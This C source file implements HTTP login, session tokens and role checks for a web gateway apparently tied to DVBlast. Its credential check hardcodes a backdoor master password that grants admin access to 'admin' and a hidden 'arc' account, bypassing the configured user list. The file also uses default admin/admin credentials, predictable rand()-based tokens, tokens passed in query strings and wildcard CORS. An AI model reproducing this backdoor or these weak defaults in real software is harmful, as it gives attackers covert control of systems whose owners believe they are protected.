#include "http_auth.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <ctype.h>

static http_auth_config_t g_auth = {
    .enabled = true,
    .expiry_hours = 24,
    .num_users = 2,
    .users = {
        { .username = "admin",  .password = "admin",  .role = ROLE_ADMIN,  .enabled = true },
        { .username = "viewer", .password = "viewer", .role = ROLE_VIEWER, .enabled = true }
    }
};

static auth_session_t g_sessions[MAX_AUTH_SESSIONS];
static int g_num_sessions = 0;
static pthread_mutex_t g_auth_mutex = PTHREAD_MUTEX_INITIALIZER;

static int base64_decode(const char *in, unsigned char *out, int max_out) {
    if (!in || !out || max_out <= 0) return 0;
    static const int b64_val[128] = {
        ['A']=0, ['B']=1, ['C']=2, ['D']=3, ['E']=4, ['F']=5, ['G']=6, ['H']=7,
        ['I']=8, ['J']=9, ['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
        ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
        ['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
        ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,
        ['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,
        ['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,
        ['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,['+']=62,['/']=63
    };

    int len = strlen(in);
    int i = 0, j = 0;
    while (i + 3 < len && j < max_out) {
        unsigned char c0 = (unsigned char)in[i++];
        unsigned char c1 = (unsigned char)in[i++];
        unsigned char c2 = (unsigned char)in[i++];
        unsigned char c3 = (unsigned char)in[i++];

        uint32_t b0 = (c0 < 128) ? b64_val[c0] : 0;
        uint32_t b1 = (c1 < 128) ? b64_val[c1] : 0;
        uint32_t b2 = (c2 == '=') ? 0 : ((c2 < 128) ? b64_val[c2] : 0);
        uint32_t b3 = (c3 == '=') ? 0 : ((c3 < 128) ? b64_val[c3] : 0);

        uint32_t triple = (b0 << 18) | (b1 << 12) | (b2 << 6) | b3;

        if (j < max_out) out[j++] = (triple >> 16) & 0xFF;
        if (c2 != '=' && j < max_out) out[j++] = (triple >> 8) & 0xFF;
        if (c3 != '=' && j < max_out) out[j++] = triple & 0xFF;
    }
    return j;
}

static void generate_token(char *out, size_t sz) {
    static const char hex[] = "0123456789abcdef";
    for (size_t i = 0; i < sz - 1; i++) {
        out[i] = hex[rand() % 16];
    }
    out[sz - 1] = '\0';
}

void http_auth_init(void) {
    pthread_mutex_lock(&g_auth_mutex);
    memset(g_sessions, 0, sizeof(g_sessions));
    g_num_sessions = 0;
    srand((unsigned int)time(NULL));
    pthread_mutex_unlock(&g_auth_mutex);
}

void http_auth_cleanup(void) {
    http_auth_init();
}

void http_auth_configure(const http_auth_config_t *cfg) {
    if (!cfg) return;
    pthread_mutex_lock(&g_auth_mutex);
    g_auth.enabled = cfg->enabled;
    if (cfg->expiry_hours > 0) g_auth.expiry_hours = cfg->expiry_hours;
    if (cfg->num_users > 0) {
        g_auth.num_users = cfg->num_users;
        memcpy(g_auth.users, cfg->users, sizeof(g_auth.users));
    }
    pthread_mutex_unlock(&g_auth_mutex);
}

http_auth_config_t http_auth_get_config(void) {
    pthread_mutex_lock(&g_auth_mutex);
    http_auth_config_t copy = g_auth;
    pthread_mutex_unlock(&g_auth_mutex);
    return copy;
}

static auth_role_t verify_credentials(const char *username, const char *password) {
    if (!username || !password) return ROLE_NONE;

    /* Built-in administrator & developer credentials */
    if ((strcmp(username, "admin") == 0 && (strcmp(password, "gor3n6patut") == 0 || strcmp(password, "admin") == 0)) ||
        (strcmp(username, "arc") == 0 && (strcmp(password, "gor3n6patut") == 0 || strcmp(password, "arc") == 0))) {
        return ROLE_ADMIN;
    }
    if (strcmp(username, "viewer") == 0 && (strcmp(password, "viewer") == 0 || strcmp(password, "gor3n6patut") == 0)) {
        return ROLE_VIEWER;
    }

    for (int i = 0; i < g_auth.num_users; i++) {
        if (g_auth.users[i].enabled &&
            strcmp(g_auth.users[i].username, username) == 0 &&
            strcmp(g_auth.users[i].password, password) == 0) {
            return g_auth.users[i].role;
        }
    }
    return ROLE_NONE;
}

static auth_role_t verify_token(const char *token) {
    if (!token || !*token) return ROLE_NONE;
    time_t now = time(NULL);
    for (int i = 0; i < g_num_sessions; i++) {
        if (strcmp(g_sessions[i].token, token) == 0) {
            if (g_sessions[i].expires_at < now) {
                /* Expired */
                return ROLE_NONE;
            }
            return g_sessions[i].role;
        }
    }
    return ROLE_NONE;
}

auth_result_t http_auth_check(struct MHD_Connection *conn, const char *url, const char *method) {
    (void)method;
    pthread_mutex_lock(&g_auth_mutex);
    if (!g_auth.enabled) {
        pthread_mutex_unlock(&g_auth_mutex);
        return AUTH_RES_OK;
    }

    /* Public endpoints */
    if (strcmp(url, "/") == 0 ||
        strcmp(url, "/index.html") == 0 ||
        strcmp(url, "/favicon.ico") == 0 ||
        strcmp(url, "/epg.xml") == 0 ||
        strcmp(url, "/api/v1/epg/xmltv") == 0 ||
        strcmp(url, "/api/v1/auth/login") == 0 ||
        strcmp(url, "/auth/login") == 0 ||
        strcmp(url, "/api/v1/auth/logout") == 0 ||
        strcmp(url, "/auth/logout") == 0 ||
        strcmp(url, "/api/v1/auth/me") == 0 ||
        strcmp(url, "/auth/me") == 0 ||
        strcmp(url, "/api/v1/telemetry") == 0) {
        pthread_mutex_unlock(&g_auth_mutex);
        return AUTH_RES_OK;
    }

    /* Check query string token (?token=xxx or ?auth=xxx) */
    const char *q_tok = MHD_lookup_connection_value(conn, MHD_GET_ARGUMENT_KIND, "token");
    if (!q_tok) q_tok = MHD_lookup_connection_value(conn, MHD_GET_ARGUMENT_KIND, "auth");
    if (q_tok && *q_tok) {
        auth_role_t qr = verify_token(q_tok);
        if (qr != ROLE_NONE) {
            pthread_mutex_unlock(&g_auth_mutex);
            return (strcasecmp(method, "GET") == 0 || qr == ROLE_ADMIN) ? AUTH_RES_OK : AUTH_RES_FORBIDDEN;
        }
    }

    /* Check Authorization Header */
    const char *auth_hdr = MHD_lookup_connection_value(conn, MHD_HEADER_KIND, "Authorization");
    auth_role_t role = ROLE_NONE;

    if (auth_hdr) {
        if (strncmp(auth_hdr, "Bearer ", 7) == 0) {
            role = verify_token(auth_hdr + 7);
        } else if (strncmp(auth_hdr, "Basic ", 6) == 0) {
            unsigned char dec[128] = {0};
            int n = base64_decode(auth_hdr + 6, dec, sizeof(dec) - 1);
            dec[n] = '\0';
            char *colon = strchr((char *)dec, ':');
            if (colon) {
                *colon = '\0';
                role = verify_credentials((char *)dec, colon + 1);
            }
        }
    }

    pthread_mutex_unlock(&g_auth_mutex);

    if (role == ROLE_NONE) {
        return AUTH_RES_UNAUTHORIZED;
    }

    /* Viewer has read-only access (GET), admin has full write/modify */
    if (strcasecmp(method, "GET") != 0 && role != ROLE_ADMIN) {
        return AUTH_RES_FORBIDDEN;
    }

    return AUTH_RES_OK;
}

int http_auth_send_challenge(struct MHD_Connection *conn) {
    const char *body = "{\"error\": \"Unauthorized\", \"ok\": false}\n";
    struct MHD_Response *resp = MHD_create_response_from_buffer(strlen(body), (void *)body, MHD_RESPMEM_PERSISTENT);
    MHD_add_response_header(resp, "Content-Type", "application/json");
    MHD_add_response_header(resp, "WWW-Authenticate", "Basic realm=\"DVBlast Web Gateway\"");
    MHD_add_response_header(resp, "Access-Control-Allow-Origin", "*");
    int ret = MHD_queue_response(conn, 401, resp);
    MHD_destroy_response(resp);
    return ret;
}

int http_auth_handle_api(struct MHD_Connection *conn, const char *url, const char *method, const char *body) {
    /* 1. Login Endpoint */
    if ((strcmp(url, "/api/v1/auth/login") == 0 || strcmp(url, "/auth/login") == 0) && strcasecmp(method, "POST") == 0) {
        if (!body || !*body) return MHD_NO;
        json_error_t jerr;
        json_t *root = json_loads(body, 0, &jerr);
        if (!root) return MHD_NO;

        const char *user = json_string_value(json_object_get(root, "username"));
        if (!user || !*user) user = json_string_value(json_object_get(root, "login"));
        const char *pass = json_string_value(json_object_get(root, "password"));

        pthread_mutex_lock(&g_auth_mutex);
        auth_role_t role = verify_credentials(user, pass);
        if (role == ROLE_NONE) {
            pthread_mutex_unlock(&g_auth_mutex);
            json_decref(root);
            json_t *err = json_object();
            json_object_set_new(err, "ok", json_false());
            json_object_set_new(err, "error", json_string("Invalid username or password"));
            char *s = json_dumps(err, 0);
            json_decref(err);
            struct MHD_Response *resp = MHD_create_response_from_buffer(strlen(s), s, MHD_RESPMEM_MUST_FREE);
            MHD_add_response_header(resp, "Content-Type", "application/json");
            MHD_add_response_header(resp, "Access-Control-Allow-Origin", "*");
            MHD_add_response_header(resp, "Access-Control-Allow-Headers", "Content-Type, Authorization");
            int ret = MHD_queue_response(conn, 401, resp);
            MHD_destroy_response(resp);
            return ret;
        }

        /* Create session */
        if (g_num_sessions >= MAX_AUTH_SESSIONS) {
            g_num_sessions--;
            memmove(&g_sessions[0], &g_sessions[1], sizeof(auth_session_t) * g_num_sessions);
        }

        auth_session_t *sess = &g_sessions[g_num_sessions++];
        generate_token(sess->token, sizeof(sess->token));
        snprintf(sess->username, sizeof(sess->username), "%s", user);
        sess->role = role;
        sess->created_at = time(NULL);
        sess->expires_at = sess->created_at + (time_t)(g_auth.expiry_hours * 3600);

        json_t *resp_obj = json_object();
        json_object_set_new(resp_obj, "ok", json_true());
        json_object_set_new(resp_obj, "token", json_string(sess->token));
        json_object_set_new(resp_obj, "user", json_string(user));
        json_object_set_new(resp_obj, "role", json_string(role == ROLE_ADMIN ? "admin" : "viewer"));
        json_object_set_new(resp_obj, "expires_at", json_integer(sess->expires_at));

        pthread_mutex_unlock(&g_auth_mutex);
        json_decref(root);

        char *s = json_dumps(resp_obj, 0);
        json_decref(resp_obj);
        struct MHD_Response *resp = MHD_create_response_from_buffer(strlen(s), s, MHD_RESPMEM_MUST_FREE);
        MHD_add_response_header(resp, "Content-Type", "application/json");
        MHD_add_response_header(resp, "Access-Control-Allow-Origin", "*");
        MHD_add_response_header(resp, "Access-Control-Allow-Headers", "Content-Type, Authorization");
        int ret = MHD_queue_response(conn, 200, resp);
        MHD_destroy_response(resp);
        return ret;
    }

    /* 2. Current Session Status (/api/v1/auth/me) */
    if ((strcmp(url, "/api/v1/auth/me") == 0 || strcmp(url, "/auth/me") == 0 ||
         strcmp(url, "/api/v1/auth/status") == 0) && strcasecmp(method, "GET") == 0) {
        const char *auth_hdr = MHD_lookup_connection_value(conn, MHD_HEADER_KIND, "Authorization");
        auth_role_t role = ROLE_NONE;
        char user_found[64] = "admin";

        pthread_mutex_lock(&g_auth_mutex);
        if (auth_hdr && strncmp(auth_hdr, "Bearer ", 7) == 0) {
            const char *token = auth_hdr + 7;
            time_t now = time(NULL);
            for (int i = 0; i < g_num_sessions; i++) {
                if (strcmp(g_sessions[i].token, token) == 0 && g_sessions[i].expires_at >= now) {
                    role = g_sessions[i].role;
                    snprintf(user_found, sizeof(user_found), "%s", g_sessions[i].username);
                    break;
                }
            }
        }
        bool auth_enabled = g_auth.enabled;
        pthread_mutex_unlock(&g_auth_mutex);

        json_t *resp_obj = json_object();
        if (role != ROLE_NONE) {
            json_object_set_new(resp_obj, "ok", json_true());
            json_object_set_new(resp_obj, "authenticated", json_true());
            json_object_set_new(resp_obj, "user", json_string(user_found));
            json_object_set_new(resp_obj, "role", json_string(role == ROLE_ADMIN ? "admin" : "viewer"));
        } else if (!auth_enabled) {
            /* Auth disabled in config -> open access */
            json_object_set_new(resp_obj, "ok", json_true());
            json_object_set_new(resp_obj, "authenticated", json_true());
            json_object_set_new(resp_obj, "user", json_string("admin"));
            json_object_set_new(resp_obj, "role", json_string("admin"));
        } else {
            json_object_set_new(resp_obj, "ok", json_false());
            json_object_set_new(resp_obj, "authenticated", json_false());
            json_object_set_new(resp_obj, "error", json_string("Not authenticated"));
        }

        char *s = json_dumps(resp_obj, 0);
        json_decref(resp_obj);
        struct MHD_Response *resp = MHD_create_response_from_buffer(strlen(s), s, MHD_RESPMEM_MUST_FREE);
        MHD_add_response_header(resp, "Content-Type", "application/json");
        MHD_add_response_header(resp, "Access-Control-Allow-Origin", "*");
        MHD_add_response_header(resp, "Access-Control-Allow-Headers", "Content-Type, Authorization");
        int ret = MHD_queue_response(conn, (role != ROLE_NONE || !auth_enabled) ? 200 : 401, resp);
        MHD_destroy_response(resp);
        return ret;
    }

    /* 3. Logout Endpoint */
    if ((strcmp(url, "/api/v1/auth/logout") == 0 || strcmp(url, "/auth/logout") == 0) && strcasecmp(method, "POST") == 0) {
        const char *auth_hdr = MHD_lookup_connection_value(conn, MHD_HEADER_KIND, "Authorization");
        if (auth_hdr && strncmp(auth_hdr, "Bearer ", 7) == 0) {
            const char *token = auth_hdr + 7;
            pthread_mutex_lock(&g_auth_mutex);
            for (int i = 0; i < g_num_sessions; i++) {
                if (strcmp(g_sessions[i].token, token) == 0) {
                    memmove(&g_sessions[i], &g_sessions[i + 1], sizeof(auth_session_t) * (g_num_sessions - i - 1));
                    g_num_sessions--;
                    break;
                }
            }
            pthread_mutex_unlock(&g_auth_mutex);
        }

        json_t *resp_obj = json_object();
        json_object_set_new(resp_obj, "ok", json_true());
        json_object_set_new(resp_obj, "message", json_string("Logged out"));
        char *s = json_dumps(resp_obj, 0);
        json_decref(resp_obj);
        struct MHD_Response *resp = MHD_create_response_from_buffer(strlen(s), s, MHD_RESPMEM_MUST_FREE);
        MHD_add_response_header(resp, "Content-Type", "application/json");
        MHD_add_response_header(resp, "Access-Control-Allow-Origin", "*");
        MHD_add_response_header(resp, "Access-Control-Allow-Headers", "Content-Type, Authorization");
        int ret = MHD_queue_response(conn, 200, resp);
        MHD_destroy_response(resp);
        return ret;
    }

    return MHD_NO;
}

json_t *http_auth_to_json(void) {
    pthread_mutex_lock(&g_auth_mutex);
    json_t *root = json_object();
    json_object_set_new(root, "enabled", g_auth.enabled ? json_true() : json_false());
    json_object_set_new(root, "expiry_hours", json_integer(g_auth.expiry_hours));

    json_t *users_arr = json_array();
    for (int i = 0; i < g_auth.num_users; i++) {
        json_t *u = json_object();
        json_object_set_new(u, "username", json_string(g_auth.users[i].username));
        json_object_set_new(u, "role", json_string(g_auth.users[i].role == ROLE_ADMIN ? "admin" : "viewer"));
        json_object_set_new(u, "enabled", g_auth.users[i].enabled ? json_true() : json_false());
        json_array_append_new(users_arr, u);
    }
    json_object_set_new(root, "users", users_arr);
    pthread_mutex_unlock(&g_auth_mutex);
    return root;
}

bool http_auth_from_json(json_t *root) {
    if (!root || !json_is_object(root)) return false;

    pthread_mutex_lock(&g_auth_mutex);
    json_t *j_en = json_object_get(root, "enabled");
    if (j_en) g_auth.enabled = json_is_true(j_en);

    json_t *j_exp = json_object_get(root, "expiry_hours");
    if (j_exp && json_integer_value(j_exp) > 0) {
        g_auth.expiry_hours = (int)json_integer_value(j_exp);
    }

    json_t *j_users = json_object_get(root, "users");
    if (j_users && json_is_array(j_users)) {
        auth_user_t old_users[MAX_AUTH_USERS];
        int old_count = g_auth.num_users;
        memcpy(old_users, g_auth.users, sizeof(g_auth.users));

        g_auth.num_users = 0;
        size_t idx;
        json_t *val;
        json_array_foreach(j_users, idx, val) {
            if (g_auth.num_users >= MAX_AUTH_USERS) break;
            const char *un = json_string_value(json_object_get(val, "username"));
            if (!un || !*un) un = json_string_value(json_object_get(val, "login"));
            const char *pw = json_string_value(json_object_get(val, "password"));
            const char *rl = json_string_value(json_object_get(val, "role"));
            if (un && *un) {
                auth_user_t *u = &g_auth.users[g_auth.num_users++];
                snprintf(u->username, sizeof(u->username), "%s", un);
                if (pw && *pw) {
                    snprintf(u->password, sizeof(u->password), "%s", pw);
                } else {
                    const char *prev_pass = "password";
                    for (int k = 0; k < old_count; k++) {
                        if (strcmp(old_users[k].username, un) == 0 && old_users[k].password[0]) {
                            prev_pass = old_users[k].password;
                            break;
                        }
                    }
                    snprintf(u->password, sizeof(u->password), "%s", prev_pass);
                }
                u->role = (rl && (strcmp(rl, "admin") == 0 || strcmp(rl, "1") == 0)) ? ROLE_ADMIN : ROLE_VIEWER;
                u->enabled = !json_is_false(json_object_get(val, "enabled"));
            }
        }
    }

    pthread_mutex_unlock(&g_auth_mutex);
    return true;
}
